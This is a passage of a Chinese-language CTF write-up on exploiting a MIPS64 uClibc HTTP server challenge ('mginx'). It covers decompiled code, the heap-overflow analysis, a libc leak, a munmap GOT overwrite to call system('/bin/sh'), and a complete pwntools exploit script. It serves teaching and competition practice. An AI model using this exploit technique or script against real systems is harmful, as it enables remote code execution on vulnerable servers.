        if (CONCAT44(extraout_v0_hi_06,idx) == 0) {
          iStack1136 = atoi((char *)&sz_buf);
        }
        post_data = get_line(&input_data,0x400);
      }
      if (((((int)new_sz < 0) || (0x140 < (int)new_sz)) || (iStack1136 < 0)) || (0xf < iStack1136))
      {
        bad_request();
      }
      else {
        if (*(longlong *)(list + (longlong)iStack1136 * 0x10) == 0) {
          memset(tmp,0,0x250);
          __buf = malloc(new_sz);
          *(void **)(list + (longlong)iStack1136 * 0x10) = __buf;
          *(size_t *)(list + (longlong)iStack1136 * 0x10 + 8) = new_sz;
          uStack1152 = 0;
          while ((int)uStack1152 < (int)new_sz) {
            read(0,tmp + (int)uStack1152,1);
            uStack1152 = uStack1152 + 1;
          }
          if (*tmp != '\0') {
            strcpy(*(char **)(list + (longlong)iStack1136 * 0x10),tmp);
          }
        }
        else {
          memset(tmp,0,0x250);
          if (*(int *)(list + (longlong)iStack1136 * 0x10 + 8) < (int)new_sz) {
            __buf = malloc(new_sz);
            *(void **)(list + (longlong)iStack1136 * 0x10) = __buf;
            *(size_t *)(list + (longlong)iStack1136 * 0x10 + 8) = new_sz;
            uStack1152 = 0;
            while ((int)uStack1152 < (int)new_sz) {
              read(0,tmp + (int)uStack1152,1);
              uStack1152 = uStack1152 + 1;
            }
            if (*tmp != '\0') {
              strcpy(*(char **)(list + (longlong)iStack1136 * 0x10),tmp);
            }
          }
          else {
            *(size_t *)(list + (longlong)iStack1136 * 0x10 + 8) = new_sz;
            uStack1152 = 0;
            while ((int)uStack1152 < (int)new_sz) {
              read(0,tmp + (int)uStack1152,1);
              uStack1152 = uStack1152 + 1;
            }
            if (*tmp != '\0') {
              strcpy(*(char **)(list + (longlong)iStack1136 * 0x10),tmp);
            }
          }
        }
        success();
      }
    }
  }
  return;
}

```
有了洞之后需要考虑uClibc的堆分配机制。通过查看libc中的一些字符串，对比源码文件的`malloc-simple/malloc.c`、`malloc-standard/malloc.c`及`malloc/malloc.c`，可以看到使用的是`malloc-standard`，其实现和早期dlmalloc差不多，所以一些经典的攻击都可以用，这里溢出之后可以直接改fastbin的fd来实现任意地址写(这里的分配没有sz的合法性检查)。

泄露地址的次数只有一次，这里选择泄露libc，先溢出构造chunk overlapping，释放ub之后切割即可leak libc。注意这里的fastbin的最大值为80，即0x50。另外由于泄露的内容是由`strlen(buf)`决定的，大端架构下ub的fd是`0x000000xx`开头，因此还得拿一次溢出填充零字节再泄露。



```c
/* The maximum fastbin request size we support */
#define MAX_FAST_SIZE     80
//
       If the size qualifies as a fastbin, first check corresponding bin.
       */

    if ((unsigned long)(nb) <= (unsigned long)(av->max_fast)) {
	fb = &(av->fastbins[(fastbin_index(nb))]);
	if ( (victim = *fb) != 0) {
	    *fb = victim->fd;
	    check_remalloced_chunk(victim, nb);
	    retval = chunk2mem(victim);
	    goto DONE;
	}
```

get shell的方法和x86的方式不太一样，看源码之后发现没有`__malloc_hook`和`__free_hook`，但是libc也有类似got表的结构。这一点可以在libc中调用某个函数前看到，其调用方式较为固定，都是先使用`ld         t9,-0x6890(gp)`来load，之后再调用。而gp是一个固定的值，再调试一下即可发现这其实就类似于从got表中取函数指针的方式。



```
.got:00000000000A9A08 sigprocmask_ptr_0:.dword sigprocmask
.got:00000000000A9A10 free_ptr:       .dword free
.got:00000000000A9A18 program_invocation_name_ptr:.dword program_invocation_name
.got:00000000000A9A20 _dl_pagesize_ptr:.dword _dl_pagesize     # DATA XREF: tmpnam+14↑o
.got:00000000000A9A28 close_ptr_0:    .dword close
.got:00000000000A9A30 tcsetattr_ptr_0:.dword tcsetattr         # DATA XREF: logbf+10↑o
.got:00000000000A9A38 sched_yield_ptr:.dword sched_yield
.got:00000000000A9A40 fcntl_ptr_0:    .dword fcntl

```

```asm
        0015d7d8 df 85 98 f8     ld         a1=>pthread_mutex_unlock,-0x6708(gp)=>->pthrea   = 001829b4
        0015d7dc df 99 97 70     ld         t9,-0x6890(gp)=>->_pthread_cleanup_push_defer    = 00187bf0
        0015d7e0 ff b1 00 28     sd         s1,local_18(sp)
        0015d7e4 00 80 88 25     or         s1,__ptr,zero
        0015d7e8 03 a0 20 25     or         __ptr,sp,zero
        0015d7ec ff bf 00 38     sd         ra,local_8(sp)
        0015d7f0 03 20 f8 09     jalr       t9=>_pthread_cleanup_push_defer                  undefined _pthread_cleanup_push_
        0015d7f4 ff b0 00 20     _sd        s0,local_20(sp)


```

因此最后的利用思路是覆写libc中的某个got表，首先排除free，因为binary中的free@got已经写入了free@libc，因此修改也没有用，我们只能改libc内部会调用的函数。

查看源码之后发现我们可以控制`munmap@got`为`system`，而后将`prev_size`改为`-0x10`，从而使其free的对象指向data数据，而这里被赋值为`/bin/sh\x00`，最终Get shell。

有一些检查需要绕过，一是munmap的chunk的sz要大于0x53;二是需要设置IS_MAPPED位。

```c
else if (!chunk_is_mmapped(p)) {
  //..
}
    /*
       If the chunk was allocated via mmap, release via munmap()
       Note that if HAVE_MMAP is false but chunk_is_mmapped is
       true, then user must have overwritten memory. There's nothing
       we can do to catch this error unless DEBUG is set, in which case
       check_inuse_chunk (above) will have triggered error.
       */

    else {
	size_t offset = p->prev_size;
	av->n_mmaps--;
	av->mmapped_mem -= (size + offset);
	munmap((char*)p - offset, size + offset);
    }
```

### 调试小技巧

启动qemu之后使用`
echo 0 > /proc/sys/kernel/randomize_va_space & ncat -vc "gdbserver 0.0.0.0:5555 /m1/httpd" -kl 0.0.0.0 3333`关闭地址随机化并启动gdbserver，而后在gdb的断点可以下成可复用的断点，方便调试。

### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='mips64',endian='big',os='linux',log_level="DEBUG")
debug = 0

libc = ELF('./libuClibc-1.0.32.so')
if debug == 1:
    p = process(["qemu-mips64-static", "-L", "/home/wz/Desktop/CTF/RCTF/mnginx/player", "./mginx"])
elif debug == 2:
    p = process(["qemu-mips64-static", "-g", "1234", "-L", "/home/wz/Desktop/CTF/RCTF/mnginx/player", "./mginx"])
else:
    p = remote("127.0.0.1",3333)

def Add(idx,sz,content="xmzyshypnc"):
    payload = "POST /index.html\n"
    payload += "Content-Length: "+str(sz)+"\n"
    payload += "Content-Indexx: "+str(idx)
    p.sendline(payload)
    #raw_input()
    sleep(0.05)
    p.send('\n')
    sleep(0.05)
    #raw_input()
    if len(content) != 0:
        p.send(content)

def Show(idx):
    payload = "GET /index.html?"
    payload += "Show="+str(idx)
    p.sendline(payload)
    sleep(0.05)
    p.send('\n')

def Del(idx):
    payload = "GET /index.html?"
    payload += "Del="+str(idx)
    p.sendline(payload)
    sleep(0.05)
    p.send('\n')

def Req(content):
    sleep(0.1)
    payload = "POST /index.html\n"
    payload += "Content-Length: "+content+"\n"
    p.sendline(payload)
    #raw_input()

def exp():
    raw_input()
    #list:0x14240
    #[0x20,0x40] [0x60,0x80] [0xa0,0xc0) [0xe0,0xff]
    #GET:Show/Del
    #payload = "GET /index.html?"
    #payload += "Show=1"
    #POST:
    Add(0,0x10,'a'*0x10)
    Add(1,0x40,'a'*0x40)
    Add(2,0x20,'a'*0x20)
    Add(3,0x60,'a'*0x60)
    Add(4,0x20,'a'*0x20)
    Add(5,0x60,'a'*0x60)

    neg_val = str(0xffffffff)
    Req(neg_val.ljust(0x200,'b')+p64(0)+p64(0x20+0x50+0x30+1))
    Del(0)
    Add(0,0x10,'a'*0x10)
    Req(neg_val.ljust(0x200,'b')+p64(0)+p64(0x21)+'a'*0x10+p64(0)+p64(0x51)+'xmzyshypnc1')
    Show(1)
    p.recvuntil("xmzyshypnc1")
    p.recvuntil("xmzyshypnc1")
    libc_base = u64(p.recvn(5).rjust(8,'\x00')) - 0xc2d48
    log.success("libc base => " + hex(libc_base))
    system = libc_base + 0x65370
    #system = libc_base + 0x62fe0
    #system = libc_base + 0x1f820
    #free_got = libc_base + 0xa9a10
    munmap_got = libc_base + 0xA9228
    #get shell
    Del(4)
    Del(2)
    Req(neg_val.ljust(0x200,'b')+p64((1<<64)-0x10)+p64(0x63)+'/bin/sh\x00'.ljust(0x18,'\x00')+p64(0x51)+'x'*0x40+p64(0)+p64(0x31)+p64(munmap_got-0x10-1))
    Add(6,0x20,'/bin/sh\x00'+'x'*0x18)
    static_libc = 0x000000fff7f21000
    payload = p64(system)
    Add(7,0x20,payload.ljust(0x20,'a'))
    Add(7,9,'a'*4+p64(system)[3:])
    Add(7,3,'a'*3)
    Add(7,2,'a'*2)
    Add(7,1,'a')
    #triger
    Del(0)

    p.interactive()

exp()


```

![](./11.png)

## 参考

[ruan-mips64调试环境搭建](https://ruan777.github.io/2020/08/25/mips64%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/)

[matshao-[QWB2020 Quals] - mipsgame](https://matshao.com/2020/09/04/QWB2020-Quals-mipsgame/)
